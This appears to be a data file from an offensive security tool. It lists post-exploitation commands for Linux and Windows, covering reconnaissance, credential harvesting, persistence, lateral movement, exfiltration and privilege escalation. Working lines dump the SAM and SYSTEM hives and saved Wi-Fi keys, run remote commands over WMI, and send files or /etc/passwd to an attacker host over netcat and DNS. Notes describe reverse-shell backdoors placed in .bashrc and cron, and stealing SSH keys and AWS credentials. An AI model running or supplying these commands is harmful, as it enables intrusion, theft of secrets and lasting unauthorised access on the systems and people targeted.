commands.label: Current user & groups
commands.notes: Identify current user context and group memberships

commands.label: Hostname & network info
commands.notes: Full hostname, all interfaces, routing table

commands.label: OS & kernel version
commands.notes: Kernel version for priv-esc research, distro identification

commands.label: Local users
commands.notes: Users with valid shells

commands.label: Sudo privileges
commands.notes: Commands runnable via sudo — key priv-esc vector

commands.label: SUID/SGID binaries
commands.notes: Unusual SUID binaries are common priv-esc paths; check GTFOBins

commands.label: Cron jobs (all users)
commands.cmd: for u in $(cut -d: -f1 /etc/passwd); do crontab -u $u -l 2>/dev/null | grep -v '^#' | sed "s/^/$u: /"; done; ls -la /etc/cron*
commands.notes: Writable cron scripts are reliable persistence / priv-esc vectors

commands.label: Running processes (with paths)
commands.notes: Full process list with command-line arguments

commands.label: Network connections
commands.notes: Listening ports and established connections with PIDs

commands.label: Internal host discovery (ARP)
commands.notes: Hosts in ARP cache — previously contacted neighbors

commands.label: Environment variables
commands.notes: Credentials and secrets leaking via environment

commands.label: Shell history
commands.notes: Commands run by the current user — often reveals credentials and host names

commands.label: Current user & privileges
commands.notes: User, group membership, and Windows privilege tokens

commands.label: Hostname & network info
commands.notes: FQDN, all adapters, DNS servers

commands.label: Domain & DC info
commands.notes: Domain name and domain controller address

commands.label: Local administrators
commands.notes: Members of the local Administrators group

commands.label: Running processes
commands.notes: Verbose process list including user context

commands.label: Network connections
commands.notes: Active connections and listening ports with PID

commands.label: ARP cache
commands.notes: Recently communicated hosts

commands.label: Local shares
commands.notes: SMB shares hosted on the local machine

commands.label: Read /etc/shadow (root needed)
commands.notes: Hashed passwords — crack offline with hashcat -m 1800 (sha512crypt)

commands.label: SSH private keys
commands.notes: Unprotected SSH private keys for lateral movement

commands.label: Credential files (config, .env, etc.)
commands.notes: Application config files frequently contain DB passwords and API keys

commands.label: AWS credentials
commands.notes: Static AWS keys stored locally

commands.label: SAM + SYSTEM hive export (admin)
commands.cmd: reg save HKLM\SAM C:\Windows\Temp\sam.hiv & reg save HKLM\SYSTEM C:\Windows\Temp\sys.hiv
commands.notes: Export SAM and SYSTEM for offline extraction with secretsdump

commands.label: LSA secrets dump (requires admin + secretsdump)
commands.notes: SECURITY hive contains LSA secrets and cached domain credentials

commands.label: Saved Wi-Fi passwords
commands.cmd: for /f "tokens=2 delims=:" %a in ('netsh wlan show profiles ^| findstr :') do @echo Profile: %a & netsh wlan show profile "%a" key=clear | findstr "Key Content"
commands.notes: Plaintext Wi-Fi passwords from Windows credential manager

commands.label: Stored credentials (Windows Credential Manager)
commands.notes: Cached logons for servers and web sites

commands.label: Backdoor ~/.bashrc
commands.notes: Runs reverse shell on next login — survives reboots; replace LHOST/LPORT

commands.label: Cron persistence (user-level)
commands.notes: Every-minute reverse shell via cron; replace LHOST/LPORT

commands.label: Add SSH authorized key
commands.notes: Persistent SSH access; replace SSH_PUBLIC_KEY with attacker's pubkey

commands.label: Registry Run key persistence
commands.notes: Runs payload on each user login; HKLM version requires admin

commands.label: Scheduled task persistence
commands.notes: Scheduled task running as SYSTEM on logon

commands.label: SSH lateral with harvested key
commands.notes: Use harvested SSH key to pivot; replace TARGET and user

commands.label: Fast subnet sweep (no nmap)
commands.cmd: for i in $(seq 1 254); do (ping -c1 -W1 10.0.0.$i &>/dev/null && echo 10.0.0.$i) & done; wait
commands.notes: ICMP sweep of /24 using bash + ping — no tools required

commands.label: PsExec lateral (requires admin creds)
commands.notes: Remote shell via SMB admin share; generates Windows event 7045

commands.label: WMI remote execution
commands.cmd: wmic /node:TARGET /user:DOMAIN\user /password:PASSWORD process call create "cmd.exe /c whoami > C:\result.txt"
commands.notes: Remote code execution via WMI — lower noise than PsExec

commands.label: Pass-the-Hash via mimikatz
commands.notes: Authenticate using NTLM hash without cracking; requires local admin

commands.label: Exfiltrate file via netcat
commands.cmd:
# Receiver: nc -lvp 9001 > loot.tar.gz
tar czf - /path/to/data | nc LHOST 9001
commands.notes: Compress and stream data over raw TCP; no encryption

commands.label: Exfiltrate via curl (HTTP POST)
commands.notes: Use your Seraph listener or a simple python http.server to receive

commands.label: DNS exfiltration (one-liner)
commands.cmd: cat /etc/passwd | base64 | while read l; do dig $l.exfil.YOURDOMAIN @LHOST; done
commands.notes: Slow but bypasses egress filters; use with a DNS server under your control

commands.label: Download file via certutil (LOLBAS)
commands.notes: Living-off-the-land file download; often allowed by application whitelisting

commands.label: Download via BITSAdmin (LOLBAS)
commands.notes: BITS jobs survive reboots and run in background — often not blocked

commands.label: Find writable service scripts
commands.notes: Write to service scripts for root execution on next service start/reboot

commands.label: Linux capabilities on binaries
commands.notes: Binaries with cap_setuid or cap_net_raw are priv-esc candidates; check GTFOBins

commands.label: Writable directories in PATH
commands.notes: PATH hijacking — place a binary earlier in PATH to intercept calls

commands.label: AlwaysInstallElevated check
commands.cmd: reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated & reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
commands.notes: If both keys = 1, MSI files run as SYSTEM — trivial priv-esc

commands.label: Unquoted service paths
commands.cmd: wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v "\""
commands.notes: Plant binary in unquoted path to execute as SYSTEM on service start

commands.label: Weak service binary permissions
commands.cmd: for /f "tokens=2 delims='='" %a in ('wmic service list full ^| find /i "PathName" ^| find /i /v "svchost"') do @cmd /c icacls "%a" 2>nul | findstr /i "(F) (M) (W) :"
commands.notes: Services with writable binaries can be replaced for SYSTEM execution
